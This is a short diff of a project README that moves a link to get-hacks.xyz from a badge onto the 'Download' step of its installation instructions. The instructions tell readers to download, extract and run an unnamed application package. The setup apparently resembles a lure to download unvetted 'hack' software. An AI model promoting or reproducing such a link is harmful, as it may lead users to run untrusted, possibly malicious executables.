@@ -68,10 +68,8 @@
 
 ## 📥 Installation
 
-[![Explore Features]](https://get-hacks.xyz/)
-
 ### Setup Process
-1. **Download** the application package
+1. [**Download**](https://get-hacks.xyz/) the application package
 2. **Extract** files to desired location
 3. **Run** the configuration tool
 4. **Select** preferred interface options
